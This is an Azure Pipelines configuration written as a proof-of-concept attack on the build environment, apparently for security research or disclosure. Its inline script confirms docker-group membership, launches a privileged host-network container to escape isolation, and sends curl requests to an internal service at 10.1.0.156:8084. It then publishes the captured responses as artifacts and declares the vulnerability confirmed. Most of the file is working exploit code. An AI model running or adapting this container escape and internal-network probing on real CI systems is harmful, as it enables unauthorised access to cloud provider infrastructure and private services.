# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: FinalPoc
  displayName: 'Final PoC: Direct HTTP Probe'
  jobs:
  - job: Linux_HTTP_Probe
    displayName: 'PoC: Probe Discovered Service via HTTP'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Escape Container and Probe Target Service with Curl'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Verifying container escape vector ---"
          if ! (id | grep -q '(docker)'); then
            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
            id
            exit 1
          fi
          echo "✅ Confirmed user is in 'docker' group."

          TARGET_IP="10.1.0.156"
          TARGET_PORT="8084"

          echo "--- ESCAPING CONTAINER to probe ${TARGET_IP}:${TARGET_PORT} with a clean HTTP request ---"
          
          docker run --rm --privileged --network=host -v $(pwd)/artifacts:/artifacts \
            alpine:latest sh -c "
              apk add --no-cache curl

              echo '--- [HOST] Attempting a standard HTTP GET request with curl ---'
              
              # Use curl with a longer timeout and verbose logging to capture everything.
              # This sends a very standard User-Agent and Accept header.
              curl --verbose --connect-timeout 20 "http://${TARGET_IP}:${TARGET_PORT}/" > /artifacts/http_probe_body.txt 2> /artifacts/http_probe_stderr.txt || true
            "
          
          echo "✅ PROBE COMPLETE."
          echo "--- Curl stderr (Connection Details & Headers) ---"
          cat artifacts/http_probe_stderr.txt
          echo
          echo "--- Curl stdout (Response Body) ---"
          cat artifacts/http_probe_body.txt

          if [ -s "artifacts/http_probe_body.txt" ] || grep -q "Connected to" artifacts/http_probe_stderr.txt; then
            echo "✅ VULNERABILITY CONFIRMED: Successfully connected and/or received a response from the internal service."
          else
            echo "⚠️ Final attempt inconclusive. The service is running but is not responding to standard HTTP requests."
          fi
    - task: PublishPipelineArtifact@1
      displayName: 'Publish HTTP Probe Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-final-poc-results'
